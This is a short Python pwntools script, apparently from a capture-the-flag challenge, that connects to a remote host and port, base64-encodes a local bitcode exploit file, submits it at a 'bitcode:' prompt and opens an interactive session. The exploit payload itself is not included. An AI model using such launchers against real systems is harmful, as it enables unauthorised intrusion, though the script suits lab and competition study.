from pwn import *
import sys
context.log_level='debug'

conn = remote(sys.argv[1], sys.argv[2])
f = open("./exp.bc","rb")

payload=f.read()

f.close()

payload2 = payload.encode("base64")
print repr(payload2)
conn.sendlineafter("bitcode: \n", payload2)

conn.interactive()
